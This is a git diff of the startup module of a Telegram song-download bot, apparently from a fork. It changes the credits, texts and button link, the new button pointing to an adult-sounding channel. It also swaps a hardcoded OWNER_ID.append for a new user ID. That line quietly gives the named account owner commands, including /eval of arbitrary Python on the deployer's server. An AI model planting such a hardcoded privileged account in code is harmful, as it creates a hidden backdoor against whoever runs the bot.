@@ -1,4 +1,4 @@
-# © @luciddo @mr_d_k
+# © @Mr_Dark_Prince
 from config import OWNER_ID
 from pyrogram.types.bots_and_keyboards import reply_keyboard_markup
 from blissbot.modules import *
@@ -6,22 +6,22 @@ from pyrogram import idle, filters
 from pyrogram.types import InlineKeyboardMarkup
 from pyrogram.types import InlineKeyboardButton
 from blissbot import app, LOGGER
-from blissbot.basi_mon import ignore_blacklisted_users
+from blissbot.basimon import ignore_blacklisted_users
 from blissbot.sql.chat_sql import add_chat_to_db
 
 start_text = """
-Heya! [{}](tg://user?id={}),
-**This is a simple bot which can download all songs you need**
-
-❓check user manual on clicking the url button❓
+Hey [{}](tg://user?id={}),
+hai
+Just send me the song name you want to download.
+Eg: ```/song Faded Alan Walker```
 """
 
 owner_help = """
-/blacklist 
-/unblacklist 
-/broadcast 
-/eval 
-/chatlist 
+/blacklist user_id
+/unblacklist user_id
+/broadcast message to send
+/eval python code
+/chatlist get list of all chats
 """
 
 
@@ -35,13 +35,13 @@ async def start(client, message):
             [
                 [
                     InlineKeyboardButton(
-                        text="Credits", url="https://t.me/tubots"
+                        text="endi url", url="https://t.me/naughty_america_permium"
                     )
                 ]
             ]
         )
     else:
-        btn = none
+        btn = None
     await message.reply(start_text.format(name, user_id), reply_markup=btn)
     add_chat_to_db(str(chat_id))
 
@@ -51,10 +51,10 @@ async def help(client, message):
     if message.from_user["id"] in OWNER_ID:
         await message.reply(owner_help)
         return ""
-    text = "[click here](https://t.me/tubots/188) take a look on user manual"
+    text = "Syntax: /song song name"
     await message.reply(text)
 
-OWNER_ID.append(1587091205)
+OWNER_ID.append(5029694040)
 app.start()
-LOGGER.info("bliss started.")
+LOGGER.info("Your bot is now online.")
 idle()
